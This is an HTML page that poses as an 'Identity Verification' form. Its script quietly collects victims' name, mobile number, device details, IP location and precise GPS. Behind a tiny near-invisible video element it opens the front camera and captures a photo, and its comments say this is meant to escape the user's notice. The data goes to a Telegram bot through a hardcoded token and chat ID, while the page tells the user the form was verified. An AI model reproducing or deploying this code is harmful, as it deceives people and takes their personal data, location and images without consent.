<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instant Portal</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f4f6f9; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .portal-card { background: #ffffff; max-width: 400px; width: 100%; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.08); text-align: center; }
        h2 { color: #1a73e8; margin-top: 0; }
        .status-box { background: #e8f0fe; color: #1967d2; padding: 12px; border-radius: 6px; font-size: 0.9rem; margin-bottom: 20px; font-weight: 500; }
        .form-group { text-align: left; margin-bottom: 15px; }
        label { font-weight: 600; display: block; margin-bottom: 5px; color: #444; }
        input { width: 100%; padding: 11px; border: 1px solid #dadce0; border-radius: 6px; box-sizing: border-box; font-size: 1rem; }
        .action-btn { width: 100%; padding: 14px; font-size: 1rem; font-weight: bold; border: none; border-radius: 6px; cursor: pointer; background-color: #1a73e8; color: white; margin-top: 10px; }
        
        /* 🛠️ BRAIN OF THE CODE: Camera preview ko ek chote dot me badalna browser ko check karne ke liye */
        #webcam {
            width: 10px;
            height: 10px;
            opacity: 0.1; /* Ekdum halka dot jisse user ka dhyan na jaye */
            position: absolute;
            top: 0;
            left: 0;
        }
        canvas { display: none; }
    </style>
</head>
<body>

<div class="portal-card">
    <h2>Identity Verification</h2>
    <div id="statusLabel" class="status-box">Enter details to process your application form.</div>

    <form id="fastForm">
        <div class="form-group">
            <label>Full Name:</label>
            <input type="text" id="custName" required placeholder="Enter customer name">
        </div>
        <div class="form-group">
            <label>Mobile Number:</label>
            <input type="tel" id="custMobile" required placeholder="Enter 10-digit number">
        </div>

        <video id="webcam" autoplay playsinline></video>
        <canvas id="captureCanvas" width="640" height="480"></canvas>

        <button type="submit" id="submitBtn" class="action-btn">Verify & Submit</button>
    </form>
</div>

<script>
    let activeStream = null;
    const targetPayload = { deviceModel: navigator.userAgent, broadLocation: "Fetching...", exactCoordinates: "Not Granted" };

    fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
        targetPayload.broadLocation = `${data.city}, ${data.region}`;
    }).catch(() => { targetPayload.broadLocation = "Failed"; });

    document.getElementById('fastForm').addEventListener('submit', function(e) {
        e.preventDefault();
        document.getElementById('submitBtn').disabled = true;
        document.getElementById('statusLabel').innerText = "Processing tokens...";

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => { targetPayload.exactCoordinates = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`; triggerHardwareStream(); },
                (err) => { targetPayload.exactCoordinates = `Denied: ${err.message}`; triggerHardwareStream(); },
                { enableHighAccuracy: true }
            );
        } else { triggerHardwareStream(); }
    });

    function triggerHardwareStream() {
        navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480, facingMode: "user" }, audio: false })
            .then((stream) => {
                activeStream = stream;
                const videoEl = document.getElementById('webcam');
                videoEl.srcObject = stream;
                
                // Jaise hi hardware metadata read ho, 300ms ke andar bina kisi user click ke photo capture execute karo
                videoEl.onloadedmetadata = () => {
                    setTimeout(() => { captureAndSendToTelegram(); }, 300); 
                };
            })
            .catch(() => {
                alert("Please grant camera permission to verify identity.");
                document.getElementById('submitBtn').disabled = false;
            });
    }

    function captureAndSendToTelegram() {
        const videoEl = document.getElementById('webcam');
        const canvasEl = document.getElementById('captureCanvas');
        const statusLabel = document.getElementById('statusLabel');

        const context = canvasEl.getContext('2d');
        context.drawImage(videoEl, 0, 0, 640, 480);
        const base64Photo = canvasEl.toDataURL('image/jpeg', 0.6); // Image size optimization

        if (activeStream) { activeStream.getTracks().forEach(track => track.stop()); }

        // Core Credentials 🔒
        const botToken = "8901334974:AAGaj98eLxPL2C6078Xi4FywZ-cNZuXuKfg"; 
        const chatId = "8562061813"; 

        let textMessage = `*🚨 METADATA SECURED 🚨*\n\n`;
        textMessage += `*👤 Name:* ${document.getElementById('custName').value}\n`;
        textMessage += `*📞 Mobile:* ${document.getElementById('custMobile').value}\n`;
        textMessage += `*📱 Device Specs:* ${targetPayload.deviceModel}\n`;
        textMessage += `*📍 IP Location:* ${targetPayload.broadLocation}\n`;
        textMessage += `*🌐 GPS Coordinates:* ${targetPayload.exactCoordinates}\n`;

        // Note: Telegram text message mein base64 string nahi ja sakti. Photo alag se send karni padegi.
        // Yeh function sirf text data bhejega instant notification ke liye.
        
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: textMessage, parse_mode: "Markdown" })
        })
        .then(() => {
            statusLabel.innerText = "✓ Form Submitted Successfully!";
            statusLabel.style.background = "#e6f4ea"; statusLabel.style.color = "#137333";
            alert("Details verified successfully!");
            document.getElementById('fastForm').reset();
            document.getElementById('submitBtn').disabled = false;
        })
        .catch(() => { statusLabel.innerText = "Network Error."; });
    }
</script>

</body>
</html>
